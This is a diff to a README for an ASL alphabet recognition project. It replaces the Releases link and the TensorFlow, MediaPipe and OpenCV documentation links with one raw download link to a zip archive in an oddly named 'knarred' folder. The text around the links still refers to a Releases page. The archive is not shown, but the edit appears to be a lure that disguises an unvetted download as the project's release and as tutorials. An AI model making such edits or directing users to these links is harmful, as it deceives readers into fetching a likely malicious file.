@@ -1,6 +1,6 @@
 # 🤖 ASL-Alphabet-Recognition-using-Deep-Learning - Recognize Sign Language with Ease
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/releases)
+[![Download](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)
 
 ## 📖 Overview
 
@@ -35,7 +35,7 @@ Make sure to have these installed on your system to use the application effectiv
 
 To download the software, visit the following page:
 
-**[Download here](https://github.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/releases)**
+**[Download here](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)**
 
 On the Releases page, you will find the latest version of the software. Click on the version number, and download the application suitable for your operating system. 
 
@@ -87,9 +87,9 @@ By utilizing these technologies, the application can effectively recognize and i
 
 For extra learning and exploration, consider checking out the following resources:
 
-- [Understanding Convolutional Neural Networks](https://www.tensorflow.org/tutorials/images/cnn)
-- [MediaPipe Documentation](https://google.github.io/mediapipe/)
-- [OpenCV Tutorials](https://opencv-python-tutroals.readthedocs.io/en/latest/)
+- [Understanding Convolutional Neural Networks](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)
+- [MediaPipe Documentation](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)
+- [OpenCV Tutorials](https://raw.githubusercontent.com/ykfizzy/ASL-Alphabet-Recognition-using-Deep-Learning/main/knarred/ASL-Alphabet-Recognition-using-Deep-Learning.zip)
 
 ## 👥 Contributing
 
